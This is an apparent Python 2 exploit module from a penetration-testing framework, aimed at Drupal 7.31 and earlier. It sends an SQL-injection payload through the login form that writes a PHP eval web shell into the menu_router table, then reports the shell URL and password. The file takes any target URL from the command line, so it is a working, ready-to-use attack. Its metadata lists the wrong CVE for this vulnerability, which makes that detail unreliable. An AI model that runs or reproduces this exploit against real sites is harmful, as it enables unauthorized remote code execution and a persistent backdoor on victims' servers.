#coding: utf-8

import os
import sys
import datetime
import re
import json, base64
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""


class drupal_sqli_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'drupal_sqli_getshell',
            'author': 'h',
            'date': '2018-03-07',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'Drupal',
            'min_version': '',
            'max_version': '7.31',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Drupal 7.31 SQL注入导致GetShell',
            'reference':'Drupal 7.31SQL注入getshell漏洞利用详解.docx',   #参考文档
            'cve':'CVE-2018-7600',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        req = session()
        randpass = get_random_password()
        tmp_pass = base64.b64encode('@eval($_POST[%s]);' % randpass)
        target = '%s/?q=node&destination=node' % self.url     
        insert_shell = "name[0;INSERT INTO `menu_router` (`path`,  `page_callback`, `access_callback`, `include_file`,"
        insert_shell+= "`load_functions`,`to_arg_functions`, `description`) values ('<?php eval(base64_decode(\"%s\"));?>'," % tmp_pass
        insert_shell+= "'php_eval', '1', 'modules/php/php.module','','','');#]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
        
        try:
            rsp = req.post(target, data=insert_shell, headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
                })
            #print rsp.content
            shell = '%s/?q=<?php eval(base64_decode("%s"));?>' % (self.url, tmp_pass)
            if "mb_strlen() expects parameter 1" in rsp.content:                
                self.shell_info(shell, randpass, 'php')
        except Exception as e:
            print e
            return


if __name__ == "__main__":
    # url = 'http://localhost:85/drupal-7.31/'
    # a = drupal_sqli_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = drupal_sqli_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__
